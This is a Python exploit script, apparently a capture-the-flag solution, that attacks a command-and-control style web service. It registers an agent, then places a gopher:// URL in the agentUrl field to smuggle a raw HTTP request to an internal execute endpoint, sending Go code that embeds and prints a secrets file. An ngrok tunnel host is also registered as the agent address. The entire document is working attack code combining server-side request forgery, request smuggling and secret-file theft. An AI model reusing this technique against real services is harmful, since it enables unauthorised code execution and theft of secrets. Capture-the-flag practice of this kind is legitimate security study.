import requests
import urllib.parse

target = "https://command-and-control-719fda.chal.zip"
agent_url = "https://2cfc-118-200-237-24.ngrok-free.app"

uuid = requests.post(f"{target}/register", json={
    "agentUrl": agent_url
}).text.strip()

# This should fail because you are not allowed to embed files at absolute paths
payload = """package main

import (
  "fmt"
  _ "embed"
)

//go:embed /app/secrets/flag.go
var flag string

func main(){
  fmt.Println(flag)
}
"""

request_to_smuggle = f"""POST /agent/{uuid}/execute HTTP/1.1
Content-Length: {len(payload)}
Host: localhost:8080

""".replace("\n", "\r\n") + payload+"\r\n"

requests.post(f"{target}/register", json={
    "agentUrl": "gopher://127.0.0.1:8080/_"+urllib.parse.quote(request_to_smuggle)
}).text.strip()
